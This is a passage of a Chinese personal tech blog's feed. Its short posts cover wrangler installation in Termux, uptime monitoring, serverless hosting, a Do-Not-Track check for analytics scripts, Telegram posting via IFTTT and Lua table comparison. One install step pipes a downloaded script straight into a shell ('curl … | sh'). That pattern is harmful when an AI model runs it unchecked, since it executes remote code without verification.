src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-20-15-52-075-edit_com.termux.jpg" alt="-bash: wrangler: command not found"></p><p><code>/root/.cargo/bin/wrangler</code> 指向了<br><code>/tmp/cargo-install223hTj/release/deps/.l2s.wrangler-df5343ad789ada3c0001</code> 这个又指向了 <code>.l2s.wrangler-df5343ad789ada3c0001.0001</code> 但这个又指向的文件不存在</p><p>这里我也不知道为啥，总之我是先把 <code>/root/.cargo/bin/wrangler</code> 这个软链接删掉，然后再重新安装一次就没问题了：</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-21-04-29-578-edit_com.termux.jpg" alt="wrangler 1.19.12"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>先进入 proot，然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://sh.rustup.rs -sSf | sh<br><span class="hljs-built_in">source</span> <span class="hljs-variable">$HOME</span>/.cargo/env<br>apt install gcc perl make -y<br>cargo install wrangler<br></code></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>请<strong>不要</strong>听上面的</p><p>请<strong>不要</strong> <code>npm install -g @cloudflare/wrangler</code></p><p>这是 wrangler 1 的安装方法</p><p>你应该 <code>npm install -g wrangler</code></p><p>就没有任何问题了，也完美支持 arm64</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>云服务</tag>
      
      <tag>Cloudflare</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BetterUptime 歇逼了</title>
    <link href="/archives/4111e586/"/>
    <url>/archives/4111e586/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-06-21-34-51-758-edit_com.tencent.androidqqmail.jpg" alt="BetterUptime 的 StatusPage 发生异常，展示无法更新状态"></p><p>那么问题来了<br>StatusPage 有没有 StatusPage</p><p>如果 StatusPage 的 StatusPage 坏了是不是就需要 StatusPage 的 StatusPage 的 StatusPage</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BetterUptime 太牛皮了</title>
    <link href="/archives/ae6ef8a4/"/>
    <url>/archives/ae6ef8a4/</url>
    
    <content type="html"><![CDATA[<p>BetterUptime 最早在 09:01:46 发现了异常，然后在 09:01:59 确认了事件发生（从三个地点同时发现异常）并在 09:02:00 通知了电子邮件和 Zipier，几乎同时通知给了 Telegram Bot</p><p>然后我就能在 09:02 左右收到事件，在 09:03:59 登录 BetterUptime 确认事件并编辑状态页面</p><p>此时状态页面的事件报告刚刚被自动生成（默认在事件持续时间超过三分钟时自动生成报告的状态页面），于是现在我能在状态页事件发生不到 10 秒内发布状态更新</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-05-21-05-49-439-edit_com.microsoft.emmx.jpg" alt="事件刚发生 6 秒就发布了状态更新"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又做了个新项目</title>
    <link href="/archives/38b5ee82/"/>
    <url>/archives/38b5ee82/</url>
    
    <content type="html"><![CDATA[<p><a href="https://loliis.top/">https://loliis.top</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ServerLess 真香</title>
    <link href="/archives/16593c53/"/>
    <url>/archives/16593c53/</url>
    
    <content type="html"><![CDATA[<p>我发现我完全用不到服务器了</p><p>Heroku 搭建了 FreshRSS、PagerMaid</p><p>Vercel 搭建了博客评论后端、RSShub、个推后端、图片加速代理、域名托管</p><p>CloudflareWokers 搭建了一言管理系统、lolicon API、必应壁纸 API、pixiv 反代</p><p>还有博客用了各种 Pages，博客评论数据库用的 LeanCloud，图床用的 Netlify</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近开了个新项目，杰出兽安卓APP再次推迟</title>
    <link href="/archives/b8eaad1a/"/>
    <url>/archives/b8eaad1a/</url>
    
    <content type="html"><![CDATA[<p>如题</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>程序</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>让你的博客网站遵从 DNT 自动禁用统计跟踪</title>
    <link href="/archives/fa22932c/"/>
    <url>/archives/fa22932c/</url>
    
    <content type="html"><![CDATA[<h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>DNT 即 <code>Do Not Track</code>。是一个让用户可以通过设置浏览器，使浏览器向网站发起的 HTTP 请求头包含特定字段，让网站得知用户是否不想被追踪的<strong>约定</strong>。详细可以<a href="https://www.w3.org/TR/tracking-dnt/">参见 W3C 的文档</a>。</p><p>这里的追踪器我认为也包括 百度统计、Google Analytics 等统计模块</p><h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><p>只需要在你的统计模块代码上添加一个判断即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> dnt = navigator.<span class="hljs-property">doNotTrack</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">doNotTrack</span> || navigator.<span class="hljs-property">msDoNotTrack</span> || <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span> (!dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;1&#x27;</span>) &amp;&amp; !dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;yes&#x27;</span>) &amp;&amp; !dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;on&#x27;</span>)) &#123;<br>  <span class="hljs-comment">// add your analytics code here</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果是 Google Analytics 需要一个单独的 <code>&lt;script src=...&gt;</code> 的话可以这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Google Analytics</span><br><span class="hljs-keyword">let</span> sc=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>sc.<span class="hljs-property">async</span>=<span class="hljs-literal">true</span>;<br>sc.<span class="hljs-property">src</span>=<span class="hljs-string">&#x27;https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(sc);<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">dataLayer</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">dataLayer</span> || [];<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gtag</span>(<span class="hljs-params"></span>)&#123;dataLayer.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">arguments</span>);&#125;<br><span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;js&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br><span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;G-XXXXXXXXXX&#x27;</span>);<br></code></pre></td></tr></table></figure><p>如果用到了多个统计模块则可以将多个 <code>&lt;script&gt;</code> 标签合并成一个：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> dnt = navigator.<span class="hljs-property">doNotTrack</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">doNotTrack</span> || navigator.<span class="hljs-property">msDoNotTrack</span> || <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span> (!dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;1&#x27;</span>) &amp;&amp; !dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;yes&#x27;</span>) &amp;&amp; !dnt.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;on&#x27;</span>)) &#123;<br><br>  <span class="hljs-comment">// Microsoft Clarity</span><br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">c,l,a,r,i,t,y</span>)&#123;<br>    c[a]=c[a]||<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;(c[a].<span class="hljs-property">q</span>=c[a].<span class="hljs-property">q</span>||[]).<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">arguments</span>)&#125;;<br>    t=l.<span class="hljs-title function_">createElement</span>(r);t.<span class="hljs-property">async</span>=<span class="hljs-number">1</span>;t.<span class="hljs-property">src</span>=<span class="hljs-string">&quot;https://www.clarity.ms/tag/&quot;</span>+i;<br>    y=l.<span class="hljs-title function_">getElementsByTagName</span>(r)[<span class="hljs-number">0</span>];y.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">insertBefore</span>(t,y);<br>  &#125;)(<span class="hljs-variable language_">window</span>, <span class="hljs-variable language_">document</span>, <span class="hljs-string">&quot;clarity&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxx&quot;</span>);<br><br>  <span class="hljs-comment">// 百度统计</span><br>  <span class="hljs-keyword">var</span> _hmt = _hmt || [];<br>  (<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> hm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br>    hm.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-number">0</span>];<br>    s.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">insertBefore</span>(hm, s);<br>  &#125;)();<br><br>  <span class="hljs-comment">// Google Analytics</span><br>  <span class="hljs-keyword">let</span> sc=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>  sc.<span class="hljs-property">async</span>=<span class="hljs-literal">true</span>;<br>  sc.<span class="hljs-property">src</span>=<span class="hljs-string">&#x27;https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(sc);<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">dataLayer</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">dataLayer</span> || [];<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">gtag</span>(<span class="hljs-params"></span>)&#123;dataLayer.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">arguments</span>);&#125;<br>  <span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;js&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>  <span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;G-XXXXXXXXXX&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>DNT 有点类似于对爬虫约定的 robots.txt，但目前尊重、支持 DNT 的网站少之又少。我认为有以下几点原因：</p><ul><li><p>添加支持需要稍微花一些时间 <em>许多爬虫库遵从 robots.txt 只需要设置一个布尔值甚至是默认遵从</em></p></li><li><p>许多浏览器、脚本插件都默认设置了 DNT 却未问过用户的想法，这让 DNT 约定毫无意义</p></li><li><p>遵从 DNT 似乎对网站所有者没有好处，只会让统计信息不准确</p></li></ul><p>这里还要要点名批评几个浏览器：</p><ul><li><p>小米（安卓） - 有所谓的跟踪器防护却没有 DNT 设置，一点都不“隐私保护”</p></li><li><p>360安全、IE等 - 默认开启 DNT</p></li><li><p>via、X浏览器等（安卓） - 有 DNT 设置，却是坏的</p></li></ul><p><strong>对于部分默认开启 DNT 的浏览器：</strong><br>如果大家都默认开启，那这约定还有谁去遵守？</p>]]></content>
    
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>教程</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓APP解耦合</title>
    <link href="/archives/1f6f413d/"/>
    <url>/archives/1f6f413d/</url>
    
    <content type="html"><![CDATA[<p>杰出兽安卓APP将在 AndroLua 中引入全新资源管理系统将重复代码、字符、布局解耦，增加代码可维护性</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个推集成研究完了，搞了个个推 API</title>
    <link href="/archives/26f4dff7/"/>
    <url>/archives/26f4dff7/</url>
    
    <content type="html"><![CDATA[<p>在 AndroLua 上集成了个推，能云端推送通知消息给应用，将作为杰出兽安卓APP新版的一项新功能。还把个推的 API 封装简化了下，去掉了复杂的鉴权，可以直接用一个 http post 群发消息：<a href="https://github.com/jiesou/Geitui">https://github.com/jiesou/Geitui</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>云服务</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CloudflarePages 有中国节点？</title>
    <link href="/archives/917494f0/"/>
    <url>/archives/917494f0/</url>
    
    <content type="html"><![CDATA[<p>总看到网上有说 CloudflarePages（Workers 也是） 怎么怎么好，还有免费中国节点。可我怎么看都没有中国节点啊，速度也不快，之前 pages.dev 的域名甚至被墙了一段时间</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
      <tag>Cloudflare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓APP又要咕咕咕了</title>
    <link href="/archives/596dae1c/"/>
    <url>/archives/596dae1c/</url>
    
    <content type="html"><![CDATA[<p>主要是要用新的文章流渲染方式，新的文章内容渲染逻辑，还想加一些新的特性（比如文章更新推送之类的）</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图床源站又又从 Vercel 迁移到 Netlify</title>
    <link href="/archives/8f7754ac/"/>
    <url>/archives/8f7754ac/</url>
    
    <content type="html"><![CDATA[<p>这事情太多了，才把 Netlify 迁移到 Vercel，又TM的出事情，是因为图片路径中有 + ，Vercel 不支持，只能用 URL 编码。我天我还要再替换图片链接然后还要给 Markor 加个 URL 编码？？？<br>还是换回 Netlify 了，不过没用百度云加速，也许速度会慢一点吧</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图床源站又从 Netlify 迁移到 Vercel</title>
    <link href="/archives/2ca623f1/"/>
    <url>/archives/2ca623f1/</url>
    
    <content type="html"><![CDATA[<p>发现图床用了 Netlify + 百度云加速 之后一天到晚 522 或者超时，很是不稳定，可套了个百度云加速之后源站是什么正常来讲应该影响不大吧，我只能再把源站从 Netlify 换到 Vercel，和主站一样，只是图片放在 Gitlab 仓库里（主站在 Github）<br><a href="https://jiecs-status.betteruptime.com/incident/80699">https://jiecs-status.betteruptime.com/incident/80699</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>七牛云太恶心了，还是继续用 Gitlab</title>
    <link href="/archives/e5fde9dc/"/>
    <url>/archives/e5fde9dc/</url>
    
    <content type="html"><![CDATA[<p>我七牛云居然TM的欠了一分钱</p><p><img src="https://cdn.jiecs.top/img/2022/04/IMG_20220407_103057_122.jpg" alt="-0.01￥"><br><img src="https://cdn.jiecs.top/img/2022/04/IMG_20220407_103059_917.jpg" alt="所谓的“外网流出流量”"></p><p>你可真会起名字，我免费用的时候你怎么不说还有这个费？？？还外网流出流量</p><p>还好我长了个心眼来这看看，要是我不看谁知道它会给我欠多少，而且现在也并没有什么短信、邮件通知</p><p><img src="https://cdn.jiecs.top/img/2022/04/Screenshot_2022-04-07-10-36-22-928_com.android.browser.png" alt="使用空间源站域名获取文件要计费"></p><p>这意思是我必须用它的存储，也用它的 CDN 才能不计费，CDN 回源免费的 10G 自然是对它的 CDN 的</p><p>可七牛云的 CDN 不免费啊！只有 http 流量免费，没有 https 流量。现在谁还用 http 啊！而且 https 的网页中混合 http 内容都是会被阻止加载的。这分明就是不想让你白嫖</p><p>解决办法也只有 CDN 套 CDN，在它的七牛云 CDN 上再套一个免费的 CDN 比如百度云加速，把 http 流量转成 https，这真是太傻逼了</p><p>还是把图床都转成 Gitlab 了，然后用 Netlify 再套一个百度云加速。那七牛云的全删了，免得再出什么费</p><p>更换花了两个小时：<a href="https://jiecs-status.betteruptime.com/incident/80282">https://jiecs-status.betteruptime.com/incident/80282</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在你的博客更新文章后自动推送到 Telegram 频道 - 基于 IFTTT</title>
    <link href="/archives/abfb43e/"/>
    <url>/archives/abfb43e/</url>
    
    <content type="html"><![CDATA[<p>现在你可以通过订阅 Telegram 频道来获取本博客的文章更新信息，在博客页脚的 Follow 里就能获取到 Telegram 频道链接，这也许能降低他人关注你博客的门槛，毕竟现在用 RSS 的人确实不多</p><p>自动推送用到了 IFTTT。IFTTT 是 IF This Then That 的所缩写，可以非常方便简单地完成简单的自动化操作。而且零代码开发。只需要注册个账号，所有的 if 就会在云上监控，根据你的设置自动完成。能实现的操作有很多，例如：</p><ul><li>如果室外下雨，就关闭窗户</li><li>如果关注的 Youtube 频道更新，就收藏到印象笔记</li><li>如果这台设备收到了短信，就转发到另一台设备</li></ul><p>等等</p><p>自然也能实现“如果博客有新文章，就广播到 Telegram 频道”</p><p>先<a href="https://core.telegram.org/bots#3-how-do-i-create-a-bot">创建了一个 Telegram bot</a>（事实上 IFTTT 也提供了一个 Telegram bot，你可以用它提供的，但我想自己控制这个 bot）将它添加到你的频道里</p><p>然后打开 IFTTT 创建一个程序：</p><p>if 可以设为博客的 RSS 更新。如果是 Wordpress 也可以直接用它提供的 new post，更新也许会比 RSS 快一点吧（IFTTT 的 RSS 监听大概是一小时一次），IFTTT 也有许多其它博客的事件，比如 Blogger</p><p>then 设为 WebHook 的 Make a web request 来调用 Telegram API。如果用 IFTTT 的 bot 可以直接用它的事件</p><p>URL 为 <code>https://api.telegram.org/bot&#123;botId&#125;:&#123;botKey&#125;/sendMessage</code>，创建 bot 后 BotFather 会告诉你 botId 和 botKey<br>Method 设为 POST。不直接用 GET 然后加查询字符串是因为查询字符串要转义成 URL 编码，事情多<br>Content Type 设为 application&#x2F;json<br>Body 为 JSON 格式的数据，例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;chat_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;@jiecsChannel&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;&#123;EntryTitle&#125;&#125;\n&#123;&#123;EntryUrl&#125;&#125;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>还有一些其它的参数参考 <a href="https://core.telegram.org/bots/api#sendmessage">Telegram API 文档</a></p><p>然后更新 IFTTT 程序应该就可以了</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>Telegram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Status 状态页使用 BetterUptime</title>
    <link href="/archives/5aec3ea7/"/>
    <url>/archives/5aec3ea7/</url>
    
    <content type="html"><![CDATA[<p>博客下方的状态页现在使用 BetterUptime 来监控，BetterUptime 在全球都有节点（虽然仍然没有之前的 Cloudflare Workers 多），而且有更强的拓展性（能简单地连接到 Zapier），也有极其细致的事件系统。但 BetterUptime 免费只能添加最多十个监视器，而且可能有一些其它的隐性限制，而且状态页没有中文（免费也没法添加自定义 JS）<br>状态页：<a href="https://jiecs-status.betteruptime.com/">https://jiecs-status.betteruptime.com</a><br>由 Zapier 驱动的 RSS 订阅：<a href="https://zapier.com/engine/rss/12241775/status">https://zapier.com/engine/rss/12241775/status</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vConsole 是不是有些兼容性问题？</title>
    <link href="/archives/604e720e/"/>
    <url>/archives/604e720e/</url>
    
    <content type="html"><![CDATA[<p>发现只要在页面加载时开 <a href="https://github.com/Tencent/vConsole">vConsole</a>，博客的 Waline 评论模块就会加载不出，很是神奇。而且是有概率的，有时加载了 vConsole 评论也能出来，但 vConsole 的悬浮窗不显示；大多数时候加载了 vConsole 但 Waline 评论模块加载失败，vConsole 的悬浮窗就正常显示。这个问题算是折腾了我三天<br>加载失败时浏览器控制台还会有报错，不过懒得贴上来了</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>Android</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>www.jiecs.top 启用境内外分流</title>
    <link href="/archives/479b33fc/"/>
    <url>/archives/479b33fc/</url>
    
    <content type="html"><![CDATA[<p>虽然是 Hexo 静态站点，但也现在用了境内外分流，境内是 百度云加速 + Vercle，境外是 Cloudflare Pages，都是阿里云 DNS。境内的 Vercle 部署更新会比 Cloudflare Pages 略微快一丢丢（延迟在一分钟内），但境内的 百度云加速 CDN 有缓存，所以也并没有一点哪个更新快哪个更新慢<br>还有 Hexo 的静态资源渲染都是由 GithubActions 完成的，Vercle、Netlify 等只是托管静态资源，并不渲染。好处是更改工作流很方便，只要改一处，而且不同分流间的延迟也会更小一点，GithubActions 还有缓存会快一点（现在渲染+压缩代码的时间都是在半分钟左右）。还不重复渲染不浪费资源，更低碳环保</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>要不要换到又拍云</title>
    <link href="/archives/b0c57b7a/"/>
    <url>/archives/b0c57b7a/</url>
    
    <content type="html"><![CDATA[<p>现在用的百度云加速不算快，而且也没有访问控制之类的，考虑换到又拍云那个又拍云联盟</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于 Lua 中判断 table 是否相等遇到的一堆大坑</title>
    <link href="/archives/89bc3611/"/>
    <url>/archives/89bc3611/</url>
    
    <content type="html"><![CDATA[<p>在 Lua 中判断 table 是否相等，看上去挺简单的个问题，没想到能这么麻烦</p><p>探究问题的过程不与文章完全相同，中间有受到了一位大佬帮助才解决的问题</p><p><a href="#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81">最终代码</a></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>直接比较是不行的，估计比较的是内存位置什么的</p><p>dump&#x2F;json 序列化后比较也不行，因为 Lua 中的 key 可以是无顺序的，序列化后的字符串也是无顺序的</p><p>而且好像并没有类似 table.equal 的函数，所以似乎只能自己写一个</p><p>懒得自己写，百度一下确实有我要的内容，但我一眼看了看代码就发现有一堆很大的问题<br>这是必应第一条结果中的代码：</p><details><summary>展开</summary><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;haicoder(www.haicoder.net)\n&quot;</span>)<br>t1 = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br>t2 = &#123;[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">if</span> #t1 ~= #t2 <span class="hljs-keyword">then</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not equal!&quot;</span>)<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t1) <span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> t1[i] ~= t2[i] <span class="hljs-keyword">then</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not equal!&quot;</span>)<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t2) <span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> t1[i] ~= t2[i] <span class="hljs-keyword">then</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not equal!&quot;</span>)<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;equal!&quot;</span>)<br></code></pre></td></tr></table></figure></details><div class="note note-light">            <p>我不想点名的，但这网站还厚颜无耻的把 URL 塞在代码里，估计还是爬虫爬来批量替换的<br>这里只把原来的变量名 arr 和 arr1 换成了 t1 和 t2，其它的都没变</p>          </div><p>首先很明显最大的问题是他直接用 <code>t1[i]~=t2[i]</code> 判断 table 中的值，这显然不支持嵌套的 table，比如 <code>&#123; &#123;1&#125;,2,3&#125;</code> 这种</p><p><a id="重复比较两个 table">我还注意到他不仅使用 t1 的 key 查找 t2 比较，还用 t2 的 key 查找了 t1，这完全是浪费时间，据他说是如果出现这种情况：</a></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">t1 = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br>t2 = &#123;[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure><p>只从 t1 查找 t2 就会出错，我当时也没细看</p><h2 id="自己写判断"><a 